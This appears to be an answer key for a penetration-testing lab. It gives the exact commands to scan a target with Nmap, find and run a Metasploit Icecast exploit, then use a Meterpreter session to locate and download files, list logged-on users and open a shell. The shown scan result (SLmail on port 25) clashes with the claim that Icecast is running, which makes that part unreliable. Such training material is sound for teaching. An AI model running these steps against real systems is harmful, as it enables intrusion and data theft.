Perform a service and version scan using Nmap to determine which services are up and running:


Run the Nmap command that performs a service and version scan against the target.

Answer:
PORT     STATE  SERVICE        VERSION
25/tcp   open   smtp           SLmail smtpd 5.5.0.4433

From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:


Run the SearchSploit commands to show available Icecast exploits.

Answer:  ```searchsploit -t icecast```

Now that we know which exploits are available to us, let's start Metasploit:


Run the command that starts Metasploit:

Answer: ```msfconsole```


Search for the Icecast module and load it for use.


Run the command to search for the Icecast module:

Answer: ```search icecast```



Run the command to use the Icecast module:
Note: Instead of copying the entire path to the module, you can use the number in front of it.

Answer: ```use 0```


Set the RHOST to the target machine.


Run the command that sets the RHOST:

Answer: ```set RHOST 192.168.0.20```


Run the Icecast exploit.


Run the command that runs the Icecast exploit.

Answer: ```run```



Run the command that performs a search for the secretfile.txt on the target.

Answer: ```search -f *secretfile.txt```





You should now have a Meterpreter session open.


Run the command to performs a search for the recipe.txt on the target:

Answer: ```search -f *recipe.txt```

Bonus: Run the command that exfiltrates the recipe*.txt file:

Answer: ```download c:\Users\IEUser\Documents\Drinks.recipe.txt```


You can also use Meterpreter's local exploit suggester to find possible exploits.


Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.




Bonus
A. Run a Meterpreter post script that enumerates all logged on users.

Answer:```run post/windows/gather/enum_logged_on_users```

B. Open a Meterpreter shell.

Answer: ```shell```

C. Run the command that displays the target's computer system information:

Answer: ```sysinfo```
